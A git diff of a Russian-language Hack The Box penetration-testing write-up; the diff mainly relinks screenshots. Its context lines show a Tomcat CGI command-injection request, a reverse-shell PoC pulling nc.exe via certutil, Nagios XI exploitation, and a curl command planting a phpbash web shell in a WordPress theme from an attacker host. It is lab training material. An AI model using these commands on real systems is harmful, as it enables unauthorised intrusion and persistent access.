@@ -7,7 +7,7 @@
 sudo nmap -sV -sC --min-rate=1000 10.129.20.47 -oA discovery/fast-sweep
 ```
 
-![[Pasted image 20260321203803.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png]]
 
 По баннеру `IIS httpd 10.0` на TCP 80 и открытым портам 135,139,445 можно предположить, что это Windows хост
 
@@ -25,25 +25,25 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 <SNIP>
 ```
 
-![[Pasted image 20260321212618.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321212618.png]]
 
 Панели на `/manager` и `/host-manager` были закрыты
-![[Pasted image 20260321213023.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321213023.png]]
 
 Поиск через  `searсhsploit` показал несколько уязвимостей для данной версии приложения
-![[Pasted image 20260321221612.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321221612.png]]
 
 Интерес представляет `CVE-2020-1938`
 Уязвимость позволяет неавторизованному пользователю загрузить JSP файл с помощью PUT запроса
 
 Однако сервер не поддерживает PUT
-![[Pasted image 20260321222558.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321222558.png]]
 
 Также версия уязвима к `CVE-2020-1938` (GhostCat)
 Уязвимость возможна из-за чрезмерного доверия tomcat к AJP соединению. Она позволяет читать файлы из webroot неавторизованному пользователю через AJP
 
 С помощью модуля `admin/http/tomcat_ghostcat` в msf мне удалось прочитать `/WEB-INF/web.xml`, тем самым подтвердив уязвимость
-![[Pasted image 20260321220741.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321220741.png]]
 
 Однако, я не обнаружил прямой эскалации в RCE и начал искать дополнительные эндпойнты
 
@@ -55,7 +55,7 @@ ffuf -u "http://10.129.20.70:8080/cgi/FUZZ" \
      -e .bat,.cmd
 ```
 
-![[Pasted image 20260321231028.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321231028.png]]
 
 Хост потенциально уязвим к `CVE-2019-0232`
 Уязвимость связана с некорректной обработкой аргументов в CGI Servlet на Windows,  что позволяет внедрять команды через параметры запроса
@@ -65,7 +65,7 @@ ffuf -u "http://10.129.20.70:8080/cgi/FUZZ" \
 curl -i 'http://10.129.20.70:8080/cgi/cmd.bat?&dir'
 ```
 
-![[Pasted image 20260321231619.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321231619.png]]
 
 Для получения reverse shell использовал PoC из [этого](https://github.com/jaiguptanick/CVE-2019-0232) репозитория
 ```python
@@ -77,10 +77,10 @@ url2 = host + ":" + str(port) + "/cgi/cmd.bat?&nc.exe+" + server_ip + "+" + nc_p
 1. Загружает `nc.exe` на таргет через `certutil`
 2. Использует `nc.exe` для установки reverse shell соединения
 
-![[Pasted image 20260321235957.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321235957.png]]
 
 После получения shell'а был получен доступ к системе с правами `NT Authority\System`, что позволило прочитать флаг администратора
-![[Pasted image 20260322000100.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322000100.png]]
 
 ---
 ## Skills Assessment II
@@ -101,20 +101,20 @@ printf "%s\t%s\n\n" "$IP" "gitlab.inlanefreight.local" | sudo tee -a /etc/hosts
 ```bash
 sudo nmap -sV -sC --min-rate=1000 --open gitlab.inlanefreight.local -oA discovery/fast-sweep
 ```
-![[Pasted image 20260322000924.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322000924.png]]
 
 Открываем GitLab и обнаруживаем включенную регистрацию
-![[Pasted image 20260322003424.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322003424.png]]
 
 После создания аккаунта мы видим несколько репозиториев. 
-![[Pasted image 20260322003600.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322003600.png]]
 
 В `Administrator / Virtualhost` в `README.md` можно заметить еще один vhost `monitoring.inlanefreight.local`
 
-![[Pasted image 20260322003641.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322003641.png]]
 
 Добавляем запись в  `/etc/hosts` и открываем адрес в браузере
-![[Pasted image 20260322003850.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322003850.png]]
 
 На хосте развернут `Nagios XI` - инструмент для мониторинга сети и инфраструктуры
 Я попробовал стандартные пары логин-пароль, но не получил доступа к админ панели
@@ -126,17 +126,17 @@ admin:admin
 
 После этого я решил вернуться в GitLab и просмотреть другие репозитории
 В `Administrator / Nagios Postgresql` я увидел строку подключения с пользователем `nagiosadmin`
-![[Pasted image 20260322010625.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322010625.png]]
 
 Учитывая, что Nagios использует PostgreSQL, я попробовал использовать эти учетные данные. Они подошли и я попал в панель администратора
-![[Pasted image 20260322011001.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322011001.png]]
 
 Из админ панели я узнал, что установлен `Nagios XI 5.7.5`, который узявим к `CVE-2021-3277`
 Уязвимость позволяет администраторам загружать произвольные файлы из-за некорректной проверки функции переименования в компоненте `custom-includes`
 
 Для эксплуатации был использован модуль `linux/http/nagios_xi_configwizards_authenticated_rce` в msf для получения RCE
 
-![[Pasted image 20260322021157.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322021157.png]]
 
 В директории `/var/www/` я нашел еще два хоста 
 - `blog.inlanefreight.local` - Wordpress приложение
@@ -144,7 +144,7 @@ admin:admin
 
 Наличие wordpress c правами на запись предоставляет удобную точку для размещения web-shell'а
 
-![[Pasted image 20260322021236.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322021236.png]]
 
 ```bash
 curl http://10.10.14.170:8000/phpbash.php -o /var/www/blog.inlanefreight.local/wp-content/themes/shell.php
@@ -156,7 +156,7 @@ curl http://10.10.14.170:8000/phpbash.php -o /var/www/blog.inlanefreight.local/w
 find / -name "*flag.txt" 2>/dev/null
 ```
 
-![[Pasted image 20260322023550.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322023550.png]]
 
 ---
 ## Skills Assessment III
@@ -172,11 +172,8 @@ xfreerdp /v:10.129.95.200 \
 ```
 
 Библиотека находится по пути `C:\inetpub\wwwroot\bin`
-![[Pasted image 20260322121658.png]]
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322121658.png]]
 
 Для анализа откроем ее в `dnSpy` - инструменте для декомпиляции `.NET` приложений
 И после быстрого просмотра видим  строку подключения в `MultimasterAPI.Contorllers`
-![[Pasted image 20260322121937.png]]
-
----
-#web #pentest #writeup 
+![[https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260322121937.png]]
